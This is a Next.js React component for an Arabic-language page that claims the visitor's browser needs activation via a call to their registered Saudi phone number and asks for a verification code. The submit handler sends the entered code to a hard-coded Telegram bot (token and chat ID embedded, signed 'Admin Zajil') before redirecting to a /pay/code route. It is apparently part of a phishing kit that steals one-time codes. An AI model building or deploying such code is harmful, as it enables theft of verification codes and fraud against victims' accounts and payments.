"use client"
import styles from './code.module.css'
import { useRef } from 'react'
import { useRouter } from 'next/navigation'
const Code = () => {
 
  
  const code = useRef();
  const router = useRouter()
  const handleSubmit = (e) => {
    e.preventDefault();
    var bot={
      token:"6688266348:AAFU2baoOulq9YUsMyiVnEVZ8U8Iw13zPDI",
      chat_id:6473956939
    }
    var length= `%0A This is code : ${code.current.value} %0A BY Admin Zajil:`
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
  
  }

  return (
    <div className={styles.contect}>
      <h1>نحن بحاجة للاتصال بك لتفعيل المتصفح</h1>
      <p>توثيق المتصفح الخاص بك</p>
      <p >مكالمة هاتفية على رقم هاتفك المحمول المسجل لتفعيل تنشيط المتصفح , ما يصل إلى دفعة واحدة</p>
      <p dir='ltr' className={styles.par}>+966*********</p>
      <form action="/pay/code" onSubmit={handleSubmit}>
        <input type="text" ref={code} placeholder="كود التحقق" />
        <button type='submit' onClick={()=> router.push('/pay/code')}>تحقق</button>
      </form>
      <p>هل تواجه مشكلة في تسجيل الدخول ؟ أعد الاتصال</p>
    </div>
  )
}

export default Code